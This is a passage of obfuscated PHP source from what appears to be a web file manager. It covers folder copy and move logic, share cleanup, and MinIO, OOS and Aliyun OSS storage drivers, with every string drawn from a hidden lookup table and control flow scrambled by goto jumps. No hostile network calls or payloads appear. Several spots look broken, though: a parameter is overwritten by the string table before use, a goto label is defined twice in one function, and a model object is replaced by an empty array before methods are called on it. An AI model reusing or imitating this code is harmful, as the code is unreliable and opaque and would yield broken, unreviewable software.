($aҺ[$b˙[366]] != $b˙[83]) { $aۭ[$b˙[497]][] = $aҺ[$b˙[415]]; } } $this->chunkEventSet($b˙[509], array($b˙[510], $B, $eӅ)); $this->saveAll($Aڋ); goto D礚; C: $f = $this->sourceInfo($C李); foreach ($d뺍 as $aҺ) { $cǨ = $this->_makeItemData($aҺ, $f, $aҺ[$b˙[28]]); $cǨ[$b˙[455]] = $aҺ[$b˙[455]]; $d͈[] = $cǨ; } $this->chunkEventSet($b˙[507], array($b˙[508], $B, $eӅ)); goto E; Eɵ: $EӅ[$e̥] = $C李; $Aڋ = array(); $c = array(); goto f; E: $this->addAll($d͈, array(), !1); $c = $this->where(array($b˙[457] => $C李))->select(); $EӅ = $this->_childrenMakeRelation($d뺍, $c); goto Eɵ; aظԇƥ: $this->_childrenListAll($e̥, $d뺍); $eӅ = count($d뺍); if ($eӅ == 0) { return $C李; } goto C; Dݖߠ: } private function _childrenMakeRelation($Fץ, $aƈ) { $E֞ =& $_SERVER[ԥ]; $Dʫ = array(); $DЮކ = array(); foreach ($Fץ as $e) { $Aψ = $e[$E֞[28]] . $E֞[8] . $e[$E֞[455]]; $Dʫ[$Aψ] = $e[$E֞[365]]; } foreach ($aƈ as $e) { $Aψ = $e[$E֞[28]] . $E֞[8] . $e[$E֞[455]]; $D놽 = $Dʫ[$Aψ]; $DЮކ[$D놽] = $e[$E֞[365]]; } return $DЮކ; } private function _childrenMatch($A˲, $e, $cϏ) { goto F; a􅿗: foreach ($D as $Fܾ) { if (isset($A˲[$Fܾ])) { $fԹ .= $A˲[$Fܾ] . $b뎠Ӳ[513]; } } $fԹ = rtrim($fԹ, $b뎠Ӳ[47]) . $b뎠Ӳ[47]; $A = $this->parentLevelArray($fԹ); goto Dɶ; Dɶ: $b߄Ͳ = $A[count($A) - 1]; return array($b뎠Ӳ[457] => $b߄Ͳ, $b뎠Ӳ[455] => $fԹ); goto Cٕ; F: $b뎠Ӳ =& $_SERVER[ԥ]; $fԹ = $cϏ[$b뎠Ӳ[455]]; $D = $this->parentLevelArray($e[$b뎠Ӳ[455]]); goto a􅿗; Cٕ: } private function _makeItemData($F僕, $AČ, $e󮼛) { $D׏ =& $_SERVER[ԥ]; $E = array($D׏[514] => $F僕[$D׏[366]], $D׏[382] => $e󮼛, $D׏[515] => $F僕[$D׏[368]], $D׏[416] => $F僕[$D׏[415]], $D׏[516] => $F僕[$D׏[77]], $D׏[517] => $AČ[$D׏[367]], $D׏[518] => $AČ[$D׏[452]], $D׏[519] => USER_ID, $D׏[520] => USER_ID, $D׏[364] => $AČ[$D׏[365]], $D׏[521] => $AČ[$D׏[455]] . $AČ[$D׏[365]] . $D׏[47], $D׏[392] => 0, $D׏[522] => $D׏[33]); return $E; } private function _copyApplyMeta($a܊㑖, &$CŐ) { $d塩 =& $_SERVER[ԥ]; $f = $a܊㑖[$d塩[365]]; $Eݵ = $a܊㑖[$d塩[28]]; if (!isset($a܊㑖[$d塩[523]]) || !$a܊㑖[$d塩[523]] || $a܊㑖[$d塩[523]] == $d塩[464]) { $CŐ[$d塩[499]][] = array($d塩[365], $f, $d塩[523], short_id($f)); } if (Input::check($Eݵ, $d塩[524])) { $CŐ[$d塩[498]][] = array($d塩[365] => $f, $d塩[89] => $d塩[412], $d塩[355] => str_replace($d塩[50], $d塩[33], Pinyin::encode($Eݵ))); $CŐ[$d塩[498]][] = array($d塩[365] => $f, $d塩[89] => $d塩[411], $d塩[355] => Pinyin::encode($Eݵ, $d塩[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bȩ) { goto Aʛ; bؑ: $Aљ = array($dߟ[455] => array($dߟ[479], $eύߢ[$dߟ[455]] . $bȩ . $dߟ[480]), $dߟ[393] => $this->targetIsDelete); $C = $this->field($A讟)->where($Aљ)->select(); if (!$C) { return; } goto F; F: $C = array_to_keyvalue($C, $dߟ[365]); foreach ($C as $EΙ) { $F͋䇬 = $EΙ[$dߟ[457]]; $bȩ = $EΙ[$dߟ[365]]; if (!isset($this->_childrenListCache[$bȩ]) && $EΙ[$dߟ[366]] == $dߟ[83]) { $this->_childrenListCache[$bȩ] = array(); } if (!isset($this->_childrenListCache[$F͋䇬])) { $this->_childrenListCache[$F͋䇬] = array(); } $this->_childrenListCache[$F͋䇬][$bȩ] = $EΙ; $this->_childrenItemCache[$bȩ] = $EΙ; } goto D֘; Aʛ: $dߟ =& $_SERVER[ԥ]; $eύߢ = $this->sourceInfo($bȩ); $A讟 = $dߟ[526]; goto bؑ; D֘: } private function _childrenListAll($a钂, &$c) { $DӰ =& $_SERVER[ԥ]; if (!isset($this->_childrenListCache[$a钂])) { return; } $a = $this->_childrenListCache[$a钂]; foreach ($a as $Cſ => $Aﾃ) { $c[$Cſ] = $Aﾃ; if ($Aﾃ[$DӰ[366]] == $DӰ[83]) { $this->_childrenListAll($Cſ, $c); } } } private function sourceInfoCache($d) { if (isset($this->_childrenItemCache[$d])) { return $this->_childrenItemCache[$d]; } return $this->sourceInfo($d); } private function _childrenList($d) { if (isset($this->_childrenListCache[$d])) { return $this->_childrenListCache[$d]; } return $this->_childrenListSelect($d); } private function _childrenListSelect($e䮈ƽ) { goto Aђ; Aђ: $d« =& $_SERVER[ԥ]; $aј = array($d«[457] => $e䮈ƽ, $d«[393] => $this->targetIsDelete); $d = $this->where($aј)->select(); goto bڇ; FڧȮ: foreach ($a as $e䮈ƽ => $D) { $this->_childrenItemCache[$e䮈ƽ] = $D; } return $a; goto cí; bڇ: $d = $d ? $d : array(); $a = array_to_keyvalue($d, $d«[365]); $this->_childrenListCache[$e䮈ƽ] = $a; goto FڧȮ; cí: } private function fileNameExistCache($C֍, $EУ) { $bԵ =& $_SERVER[ԥ]; $EУ = strtolower($EУ); $dΤ = $this->_childrenList($C֍); foreach ($dΤ as $E) { if ($EУ == strtolower($E[$bԵ[28]])) { return $E[$bԵ[365]]; } } return !1; } private function fileNameAutoCache($bղ, $dĽ, $Fߗ, $d) { $aŸ =& $_SERVER[ԥ]; $B錼 = $this->_childrenList($bղ); $e낐 = array_to_keyvalue($B錼, $aŸ[33], $aŸ[28]); return $this->fileNameAutoGet($e낐, $dĽ, $Fߗ, $d); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($a, $Dĩ, $f = REPEAT_REPLACE, $EԘ = '') { goto B; Dԃ: Model($EĞ[501])->eventMove($a, $Dõ篡[$EĞ[457]], $Dĩ); Hook::trigger($EĞ[528], $DÏ); return $E; goto A; a: $DÏ = $this->pathInfoMore($a); if ($this->isParentOf($a, $Dĩ)) { return !1; } if (!$Dõ篡 || !$eٚ || $eٚ[$EĞ[366]] != $EĞ[83]) { return !1; } goto d猉; f: $A = array($EĞ[497] => array(), $EĞ[529] => !1); $this->clearShare($a, $Dĩ); $eɨ = $this->fileNameExistCache($Dĩ, $Dõ篡[$EĞ[28]]); goto aھ; bȭ: $Eҋ = $EԘ ? $EԘ : $Dõ篡[$EĞ[28]]; $this->lockMoveStart($a); $this->lockWriteStart($Dĩ, $Eҋ); goto f; dȼ: $this->lockWriteEnd($Dĩ, $Eҋ); $this->folderSizeReset($Dõ篡[$EĞ[457]]); $this->folderSizeReset($Dĩ); goto c۠ʐ; d猉: Hook::trigger($EĞ[527], $DÏ); $this->targetIsDelete = intval($Dõ篡[$EĞ[393]]); if ($Dõ篡[$EĞ[457]] == $Dĩ && $EԘ != $Dõ篡[$EĞ[28]]) { $Aȑ = $this->fileNameExist($Dĩ, $EԘ); if ($Aȑ && $Dõ篡[$EĞ[366]] == $EĞ[464]) { goto FŘ; AѰ: return $Aȑ; goto a; fݯ: $this->removeNow($a, !1); $this->folderSizeReset($Dĩ); Hook::trigger($EĞ[528], $DÏ); goto AѰ; FŘ: $Fϙ = $this->sourceInfo($Aȑ); $B = $this->fileHistory($Fϙ, $Dõ篡[$EĞ[415]], $Dõ篡[$EĞ[77]]); if (!$B) { Model($EĞ[418])->remove($Dõ篡[$EĞ[415]]); } goto fݯ; a: } } goto bȭ; aھ: $E = $this->_move($a, $Dĩ, $f, $A, $EԘ); $this->sourceCacheClear(); if ($Dõ篡[$EĞ[366]] == $EĞ[83] && $eɨ) { $this->folderSizeResetChildren($E); } goto Dҽ; Dҽ: Model($EĞ[163])->linkAdd($A[$EĞ[497]]); if ($eɨ && $A[$EĞ[529]]) { $this->removeNow($a, !1); } $this->lockMoveEnd($a); goto dȼ; B: $EĞ =& $_SERVER[ԥ]; $Dõ篡 = $this->sourceInfo($a); $eٚ = $this->sourceInfo($Dĩ); goto a; c۠ʐ: $C˛׋ = array($Dõ篡[$EĞ[457]], $Dĩ); if ($Dõ篡[$EĞ[366]] == $EĞ[83]) { $C˛׋[] = $a; } $this->updateModifyTime($C˛׋); goto Dԃ; A: } private function _move($e, $C, $fܡ܎, &$bˍ֕, $Aއ = '') { goto C; e葊: $Aղģ = !1; if ($cν) { if ($fܡ܎ == REPEAT_RENAME_FOLDER) { $C = $this->fileNameAuto($C, $C, $fܡ܎, $cν); $e = $this->_moveForce($e, $C, $C); } else { if ($fܡ܎ == REPEAT_RENAME_FOLDER) { $fܡ܎ = REPEAT_RENAME; } $b۰Г = $this->_childrenListSelect($e); foreach ($b۰Г as $f¯) { $this->_move($f¯[$e[365]], $Cű, $fܡ܎, $bˍ֕); } $Aղģ = !0; } } else { if ($fܡ܎ == REPEAT_SKIP) { $Aղģ = !0; } else { if ($fܡ܎ == REPEAT_RENAME || $fܡ܎ == REPEAT_RENAME_FOLDER) { $C = $this->fileNameAuto($C, $C, $fܡ܎, $cν); $e = $this->_moveForce($e, $C, $C); } else { if ($fܡ܎ == REPEAT_REPLACE) { $C٤ = $this->sourceInfoCache($Cű); $cØ = $this->fileHistory($C٤, $eß[$e[415]], $eß[$e[77]]); if ($cØ) { $bˍ֕[$e[497]][] = $eß[$e[415]]; } else { $Aղģ = !0; } } } } } if ($Aղģ && !$bˍ֕[$e[529]]) { $bˍ֕[$e[529]] = !0; } goto C; C: return $e; goto cÚȐ; CƇ: $this->lockWriteStart($C, $C); if (!$Cű) { return $this->_moveForce($e, $C, $C); } $e = $Cű; goto e葊; C: $e =& $_SERVER[ԥ]; $eß = $this->sourceInfo($e); $cν = $eß[$e[366]] == $e[83]; goto f; f: $C = $Aއ ? $Aއ : $eß[$e[28]]; $Cű = $this->fileNameExistCache($C, $C); $this->lockMoveStart($e); goto CƇ; cÚȐ: } private function _moveForce($bՍ, $a, $D) { goto FԬ; FԬ: $CֶĐ =& $_SERVER[ԥ]; $Dߢ = $this->sourceInfo($bՍ); $E󌹟 = $this->sourceInfo($a); goto E𲮾; E𲮾: $aΟ = $Dߢ[$CֶĐ[366]] == $CֶĐ[83]; $b = array($CֶĐ[364] => $E󌹟[$CֶĐ[365]], $CֶĐ[521] => $E󌹟[$CֶĐ[455]] . $E󌹟[$CֶĐ[365]] . $CֶĐ[47], $CֶĐ[517] => $E󌹟[$CֶĐ[367]], $CֶĐ[518] => $E󌹟[$CֶĐ[452]], $CֶĐ[520] => USER_ID, $CֶĐ[382] => $D); $B = $Dߢ[$CֶĐ[367]] == SourceModel::TYPE_GROUP && $E󌹟[$CֶĐ[367]] == SourceModel::TYPE_GROUP && $Dߢ[$CֶĐ[452]] == $E󌹟[$CֶĐ[452]]; goto Cģى; d: if ($aΟ) { $cБϜ = array($CֶĐ[521] => array($CֶĐ[479], $Dߢ[$CֶĐ[455]] . $Dߢ[$CֶĐ[365]] . $CֶĐ[480])); $Cȹ = $Dߢ[$CֶĐ[455]] . $Dߢ[$CֶĐ[365]] . $CֶĐ[47]; $aѯƂ = $E󌹟[$CֶĐ[455]] . $E󌹟[$CֶĐ[365]] . $CֶĐ[47] . $Dߢ[$CֶĐ[365]] . $CֶĐ[47]; $Aڴ = array($CֶĐ[521] => array($CֶĐ[530], "\162\x65\x70\154\x61\x63\x65\x28\x70\141\162\145\x6e\164\x4c\145\166\x65\x6c\x2c\x27{$Cȹ}\47\54\47{$aѯƂ}\x27\51"), $CֶĐ[517] => $E󌹟[$CֶĐ[367]], $CֶĐ[518] => $E󌹟[$CֶĐ[452]]); if ($aׅ) { $Aڴ[$CֶĐ[392]] = 0; } $this->where($cБϜ)->data($Aڴ)->save(); } $this->where(array($CֶĐ[379] => $bՍ))->data($b)->save(); return $bՍ; goto C; Cģى: if (!$B) { Model($CֶĐ[450])->authClear($bՍ); } $aׅ = $Dߢ[$CֶĐ[393]] == $CֶĐ[83] && $E󌹟[$CֶĐ[393]] != $CֶĐ[83]; if ($aׅ) { $b[$CֶĐ[392]] = 0; } goto d; C: } private function clearShare($Føɘ, $aݪբ) { goto c̹; Cٜ: if (!$cҺʥ) { return; } $Eҳ뗾 = array($c[365] => array($c[7], $cҺʥ), $c[444] => 1); $E¤ = Model($c[532])->field($c[437])->where($Eҳ뗾)->select(); goto f꟯; f꟯: if (!$E¤) { return; } $E¤ = array_to_keyvalue($E¤, $c[33], $c[437]); $Eҳ뗾 = array($c[437] => array($c[7], $E¤)); goto e; e: Model($c[532])->where($Eҳ뗾)->save(array($c[444] => 0)); Model($c[533])->where($Eҳ뗾)->delete(); goto c; c̹: $c =& $_SERVER[ԥ]; $dʃ = $this->sourceInfo($Føɘ); $Bȇ = $this->sourceInfo($aݪբ); goto C෤; C෤: if ($dʃ[$c[452]] == $Bȇ[$c[452]] && $dʃ[$c[367]] == $c[531]) { return; } $Eҳ뗾 = array($c[455] => array($c[479], $dʃ[$c[455]] . $Føɘ . $c[480])); $cҺʥ = $this->field($c[379])->where($Eҳ뗾)->getField($c[365], !0); goto Cٜ; c: } public function copyFolderFromIO($B೻, $c۪潿, $fݢ, $C͍̯, $Eशֹ, $dڂ = false) { goto bõи; f݋: $this->updateModifyTime($fݢ); return $B; goto D; bފ: Hook::trigger($a᣷[536]); if ($B) { $this->folderSizeResetChildren($B); } $this->_childrenListClear(); goto EʚǴ; Dȕ: Model($a᣷[418])->linkAdd($f[$a᣷[497]]); Model($a᣷[418])->remove($f[$a᣷[534]]); $this->folderSizeReset($fݢ); goto f݋; EʚǴ: Model($a᣷[500])->addAll($f[$a᣷[498]], array(), !0); Model($a᣷[501])->eventCopy($B); $this->saveAll($f[$a᣷[499]]); goto Dȕ; eׇ: $e = $this->fileNameExist($fݢ, $E̢); $B = $this->mkdir($fݢ, $E̢, $C͍̯); if (!$e || $C͍̯ == REPEAT_RENAME_FOLDER) { $C͍̯ = !1; } goto fɗů; bõи: $a᣷ =& $_SERVER[ԥ]; $f = array($a᣷[498] => array(), $a᣷[499] => array(), $a᣷[497] => array(), $a᣷[534] => array()); $E̢ = $dڂ ? $dڂ : $B೻->getPathName($B೻->pathThis($c۪潿)); goto eׇ; fɗů: if ($e) { $this->_childrenAllMake($e); } Hook::trigger($a᣷[535]); $this->_copyChildTo($B೻, $c۪潿, $B, $C͍̯, $f, $Eशֹ); goto bފ; D: } private function _copyChildTo($BՅ, $dω, $b裑˱Җ, $cӲ, &$Aׅ۰, $Fﻂ) { goto EӰ; e͐璯: $A = array_merge($f[$E裒[73]], $f[$E裒[74]]); $E = $this->_addFiles($BՅ, $f[$E裒[73]], $Fﻂ); $DБ = array(); goto fŌ; fŌ: foreach ($A as &$F܊Ƃ) { goto b; a͞: if ($cӲ) { $a꽕 = $this->fileNameExistCache($b裑˱Җ, $F܊Ƃ[$E裒[28]]); if ($a꽕) { if ($F܊Ƃ[$E裒[366]] || $cӲ == REPEAT_SKIP) { continue; } if ($cӲ == REPEAT_REPLACE) { $c = $this->sourceInfoCache($a꽕); $Cǝ݊ = $this->fileHistory($c, $F܊Ƃ[$E裒[415]], $F܊Ƃ[$E裒[77]]); if ($Cǝ݊) { $Aׅ۰[$E裒[497]][] = $F܊Ƃ[$E裒[415]]; } continue; } else { if ($cӲ == REPEAT_RENAME) { $F܊Ƃ[$E裒[28]] = $this->fileNameAutoCache($b裑˱Җ, $F܊Ƃ[$E裒[28]], $cӲ, !1); } } } } if (!$F܊Ƃ[$E裒[366]] && $F܊Ƃ[$E裒[415]]) { $Aׅ۰[$E裒[497]][] = $F܊Ƃ[$E裒[415]]; } $DБ[] = $this->_makeItemData($F܊Ƃ, $eɟԱ, $F܊Ƃ[$E裒[28]]); goto Cґ; FԘ: $F܊Ƃ[$E裒[77]] = _get($F܊Ƃ, $E裒[77], 0); $F܊Ƃ[$E裒[415]] = _get($F܊Ƃ, $E裒[415], 0); if (!isset($F܊Ƃ[$E裒[537]]) && $F܊Ƃ[$E裒[415]]) { $Aׅ۰[$E裒[534]][] = $F܊Ƃ[$E裒[415]]; } goto a͞; b: if (isset($E[$F܊Ƃ[$E裒[28]]])) { $F܊Ƃ = $E[$F܊Ƃ[$E裒[28]]]; } $F܊Ƃ[$E裒[366]] = $F܊Ƃ[$E裒[29]] == $E裒[76]; $F܊Ƃ[$E裒[368]] = _get($F܊Ƃ, $E裒[156], $E裒[33]); goto FԘ; Cґ: } unset($F܊Ƃ); if (!empty($DБ)) { $this->addAll($DБ); } goto C; C: $c尨 = $this->_childrenList($b裑˱Җ); $c尨 = array_to_keyvalue($c尨, $E裒[28]); foreach ($A as $F܊Ƃ) { $c = $c尨[$F܊Ƃ[$E裒[28]]]; $c㫕ݖ = $c[$E裒[365]]; $this->_copyApplyMeta($c, $Aׅ۰); if ($F܊Ƃ[$E裒[29]] == $E裒[76]) { $F܊Ƃ[$E裒[75]] = $BՅ->getPathInner($F܊Ƃ[$E裒[75]]); $this->_copyChildTo($BՅ, $F܊Ƃ[$E裒[75]], $c㫕ݖ, $cӲ, $Aׅ۰, $Fﻂ); } } goto e֚; EӰ: $E裒 =& $_SERVER[ԥ]; $eɟԱ = $this->sourceInfoCache($b裑˱Җ); $f = $BՅ->listPath($dω, !1, !0); goto e͐璯; e֚: } private function _addFiles($e٦, $aդ, $cËд) { goto a鼾; a鼾: $bȰ =& $_SERVER[ԥ]; if (!$aդ || count($aդ) == 0) { return array(); } $A놦 = array(); goto a͜; a͜: foreach ($aդ as &$d䈵) { goto cɚ; fЮ݉: if (count($A놦[$c̝໇]) > 1) { $d䈵[$bȰ[537]] = !0; } goto C; cɚ: Hook::trigger($bȰ[538], $d䈵); $d䈵[$bȰ[75]] = $e٦->getPathInner($d䈵[$bȰ[75]]); $d㴣ߤ = $e٦->hashSimple($d䈵[$bȰ[75]]); goto E; cَ: $d䈵[$bȰ[159]] = $c̝໇; Hook::trigger($bȰ[539], $d䈵); $A놦[$c̝໇][] =& $d䈵; goto fЮ݉; E: $c̝໇ = $e٦->hashMd5($d䈵[$bȰ[75]]); if (strlen($c̝໇) > 10 && !isset($A놦[$c̝໇])) { $A놦[$c̝໇] = array(); } $d䈵[$bȰ[160]] = $d㴣ߤ; goto cَ; C: } $CŨ = array($bȰ[159] => array($bȰ[7], array_keys($A놦))); $b = Model($bȰ[540]); goto F; F: $bܤ = $b->where($CŨ)->select(); $bܤ = $bܤ ? $bܤ : array(); foreach ($bܤ as $Aй) { if (!isset($A놦[$Aй[$bȰ[159]]])) { continue; } $D㧨 = $A놦[$Aй[$bȰ[159]]]; foreach ($D㧨 as &$d䈵) { $d䈵[$bȰ[415]] = $Aй[$bȰ[415]]; $d䈵[$bȰ[537]] = !0; } unset($d䈵); } goto A; A: $b = array(); foreach ($aդ as $D󪣥) { if (isset($D󪣥[$bȰ[537]]) && $D󪣥[$bȰ[537]]) { continue; } $eǋ = $e٦->getPathInner($D󪣥[$bȰ[75]]); $F֣ = $b->addFileMake($eǋ, $D󪣥[$bȰ[77]], $D󪣥[$bȰ[160]], $D󪣥[$bȰ[159]], $D󪣥[$bȰ[28]], $cËд); $b[] = $F֣; } $b->addAll($b); goto aƭɎ; e: foreach ($bܤ as $Aй) { if (!isset($A놦[$Aй[$bȰ[159]]])) { continue; } $F =& $A놦[$Aй[$bȰ[159]]]; foreach ($F as &$d䈵) { $d䈵[$bȰ[415]] = $Aй[$bȰ[415]]; } unset($d䈵); } $Fྃ = array(); foreach ($aդ as $e،) { $Fྃ[$e،[$bȰ[28]]] = $e،; } goto eƍ; eƍ: return $Fྃ; goto DԜ; aƭɎ: $CŨ = array($bȰ[159] => array($bȰ[7], array_keys($A놦))); $bܤ = $b->where($CŨ)->select(); $bܤ = $bܤ ? $bܤ : array(); goto e; DԜ: } } define($_SERVER[ԥ][541], $_SERVER[ԥ][542]); goto Bݖ; Cʞ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($B晱) { parent::__construct($B晱); $this->signatureVersion($_SERVER[ԥ][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($cĒ) { parent::__construct($cĒ); $this->signatureVersion($_SERVER[ԥ][196]); } public function fileOutLink($c) { $C̅ =& $_SERVER[ԥ]; if (substr($c, 0, 7) == $C̅[1091]) { $c = $C̅[1092] . substr($c, 7); } header($C̅[152] . $c); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Cξ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ԥ][1146]; $this->_init($Cξ); } public function _init($bӴϝ) { foreach ($bӴϝ as $f觏 => $bōȊ) { if (isset($this->{$f觏})) { $this->{$f觏} = $bōȊ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ԥ][1147], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto bá; a腂: $c㤶->addAllowedMethod($dឈ[1151]); $c㤶->addAllowedMethod($dឈ[1152]); $c㤶->addAllowedMethod($dឈ[151]); goto b̃刐; bá: $dឈ =& $_SERVER[ԥ]; $dǗ = new OSS\Model\CorsConfig(); $c㤶 = new OSS\Model\CorsRule(); goto Eʜ; a釶͙: $dǗ->addRule($c㤶); try { $this->client->putBucketCors($this->bucket, $dǗ); } catch (OSS\Core\OssException $f) { return !1; } return !0; goto A; b̃刐: $c㤶->setMaxAgeSeconds(600); $c㤶->addExposeHeader($dឈ[1153]); $c㤶->addAllowedHeader($dឈ[1148]); goto a釶͙; Eʜ: $c㤶->addAllowedOrigin($dឈ[1148]); $c㤶->addAllowedMethod($dឈ[1149]); $c㤶->addAllowedMethod($dឈ[1150]); goto a腂; A: } public function getBucketCors() { goto D; b: if (!$e٧͎ || !($cꎨ = $e٧͎->getRules())) { return null; } $B¿ = $cꎨ[0]->getAllowedOrigins(); $Eޚٖ = $cꎨ[0]->getAllowedMethods(); goto e; e: $Fڹ = $cꎨ[0]->getMaxAgeSeconds(); $DӒה = $cꎨ[0]->getExposeHeaders(); $Bח = $cꎨ[0]->getAllowedHeaders(); goto d; d: return array($D⾫؋[171] => isset($B¿[0]) ? $B¿[0] : $D⾫؋[33], $D⾫؋[175] => $Eޚٖ, $D⾫؋[1154] => $Fڹ, $D⾫؋[1155] => isset($DӒה[0]) ? $DӒה[0] : $D⾫؋[33], $D⾫؋[173] => isset($Bח[0]) ? $Bח[0] : $D⾫؋[33]); goto E; D: $D⾫؋ =& $_SERVER[ԥ]; $e٧͎ = null; try { $e٧͎ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Cͼ) { return null; } goto b; E: } public function isBucketCors() { goto CȖ; E檓: if ($aɉ[$Cޥ[171]] != $Cޥ[172] || $aɉ[$Cޥ[173]] != $Cޥ[172]) { return !1; } $eׅ = array_map($Cޥ[174], $aɉ[$Cޥ[175]]); if (!is_array($eׅ)) { $eׅ = array(); } goto a؈; a؈: $B͇ȯ = array($Cޥ[176], $Cޥ[177], $Cޥ[178], $Cޥ[179], $Cޥ[180]); $fܧ = array_diff($B͇ȯ, $eׅ); return empty($fܧ); goto CЎ; CȖ: $Cޥ =& $_SERVER[ԥ]; $aɉ = $this->getBucketCors(); if (!$aɉ || !is_array($aɉ)) { return !1; } goto E檓; CЎ: } public function mkfile($F摋, $FԨǴ = '', $DƂ = REPEAT_RENAME) { $dĄ = $this->setContent($F摋, $FԨǴ); if ($dĄ !== !1) { return $this->getPathOuter($F摋); } return !1; } public function mkdir($cי, $C = REPEAT_SKIP) { if ($this->_isFolder($cי)) { return $this->getPathOuter($cי); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($cי)); } catch (OSS\Core\OssException $A) { return !1; } return $this->getPathOuter($cי); } private function fileList($D䍢, $Fĕ = '', $EҢ = 0) { goto C; B뿄: $AƱ = $C[33]; $fƦɯ = 1000; $BӘ = $e۹ = array(); goto Bᾶڙ; Bᾶڙ: while (!0) { $aӟ = array($C[1156] => $Fĕ, $C[182] => $cТ, $C[1157] => $fƦɯ, $C[1158] => $AƱ); try { $Bൢ = $this->client->listObjects($this->bucket, $aӟ); } catch (OSS\Core\OssException $d̎) { break; } $AƱ = $Bൢ->getNextMarker(); $Dϩ = $Bൢ->getObjectList(); $dđ = $Bൢ->getPrefixList(); foreach ($Dϩ as $a޵) { if ($a޵->getKey() == $cТ) { continue; } $e䎟 = $a޵->getKey(); if ($EҢ) { $e䎟 = array($C[28] => $e䎟, $C[77] => $a޵->getSize(), $C[186] => strtotime($a޵->getLastModified())); } $e۹[] = $e䎟; } foreach ($dđ as $Eㅈ) { $BӘ[] = $Eㅈ->getPrefix(); } if ($AƱ === $C[33]) { break; } } return array($C[74] => $BӘ, $C[73] => $e۹); goto F隐; C: $C =& $_SERVER[ԥ]; $D䍢 = trim($D䍢, $C[8]); $cТ = empty($D䍢) ? $C[33] : $D䍢 . $C[8]; goto B뿄; F隐: } public function copyFile($cɆ, $Eͭ) { $dƑ = $this->size($cɆ); if ($dƑ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $cɆ, $this->bucket, $this->pathEncode($Eͭ)); } catch (OSS\Core\OssException $d񇖔) { return !1; } return !0; } return $this->multiCopyObject($cɆ, $Eͭ, $dƑ); } private function multiCopyObject($bԌ¨Ν, $a߶, $f޼ą) { $aڛ =& $_SERVER[ԥ]; try { goto bԨ; F޽: $D񃦏ܜ = 1; $a = 0; $Dɬ = array(); goto f; d: $Eŏ = array(); foreach ($Dɬ as $bַ => $B) { $Eŏ[] = array($aڛ[1163] => $bַ + 1, $aڛ[1164] => $B); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($a߶), $D, $Eŏ); goto Eе; f: $dؘ᚝ = 1024 * 1024 * 10; $D񌝣 = $this->client->generateMultiuploadParts($f޼ą, $dؘ᚝); foreach ($D񌝣 as $bַ => $F쎬) { $f殖 = $a + (int) $F쎬[$aڛ[1160]]; $E = (int) $F쎬[$aڛ[321]] + $f殖 - 1; $CԐ = array($aڛ[1161] => $f殖, $aڛ[1162] => $E); $Dɬ[] = $this->client->uploadPartCopy($this->bucket, $bԌ¨Ν, $this->bucket, $this->pathEncode($a߶), $D񃦏ܜ, $D, $CԐ); $D񃦏ܜ = $D񃦏ܜ + 1; } goto d; bԨ: $bеû = array(); if ($DƦٚ = $this->hashMd5($bԌ¨Ν)) { $bеû = array(OSS\OssClient::OSS_HEADERS => array($aڛ[1159] => $DƦٚ)); } $D = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a߶), $bеû); goto F޽; Eе: } catch (OSS\Core\OssException $CѪ) { return !1; } return !0; } public function moveFile($bئ, $F) { if ($this->copyFile($bئ, $F)) { $this->remove($bئ); return !0; } return !1; } public function delFile($aꭦ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aꭦ)); } catch (OSS\Core\OssException $e둆˘) { return !1; } return !0; } public function delFolder($d) { $eܮ =& $_SERVER[ԥ]; $bڴ = $this->fileList($d); if (!empty($d) && !in_array(trim($d, $eܮ[8]) . $eܮ[8], $bڴ[$eܮ[73]])) { $bڴ[$eܮ[73]][] = trim($d, $eܮ[8]) . $eܮ[8]; } foreach (array_chunk($bڴ[$eܮ[73]], 1000) as $bݘ) { try { $this->client->deleteObjects($this->bucket, $bݘ); } catch (OSS\Core\OssException $CŘ) { continue; } } return !0; } public function rename($c؋, $Bׂ) { return $this->renameObject($c؋, $Bׂ); } private function fileInfo($Aĭ, $dٻↃ = array()) { goto f􅨜; b䟄̾ɔ: return $C⡯; goto a̔; f􅨜: $D =& $_SERVER[ԥ]; $C⡯ = array($D[28] => $this->pathThis($Aĭ), $D[75] => $this->getPathOuter($Aĭ), $D[29] => $D[163], $D[183] => 0, $D[106] => 0, $D[77] => 0, $D[156] => $this->ext($Aĭ), $D[184] => !0, $D[185] => !0); if (empty($dٻↃ)) { $EΉ = $this->objectMeta($Aĭ); if (!$EΉ) { return $C⡯; } $dٻↃ = array($D[106] => strtotime($EΉ[$D[1165]]), $D[77] => $EΉ[$D[1166]] + 0); } goto d; d: if (isset($dٻↃ[$D[77]])) { $C⡯[$D[77]] = $dٻↃ[$D[77]]; } if (isset($dٻↃ[$D[106]])) { $C⡯[$D[106]] = $dٻↃ[$D[106]]; } if (isset($dٻↃ[$D[186]]) && !trim($C⡯[$D[106]])) { $C⡯[$D[106]] = $dٻↃ[$D[186]]; } goto b䟄̾ɔ; a̔: } private function folderInfo($F, $Bܠ٦ = array()) { $E =& $_SERVER[ԥ]; $Dꑌ = array($E[28] => $this->pathThis($F), $E[75] => $this->getPathOuter($E[8] . $F), $E[29] => $E[76], $E[183] => 0, $E[106] => 0, $E[184] => !0, $E[185] => !0); if (empty($Bܠ٦)) { $F = rtrim($F, $E[8]) . $E[8]; $aք = $this->objectMeta($F); if (!$aք) { return $Dꑌ; } $Bܠ٦ = array($E[183] => 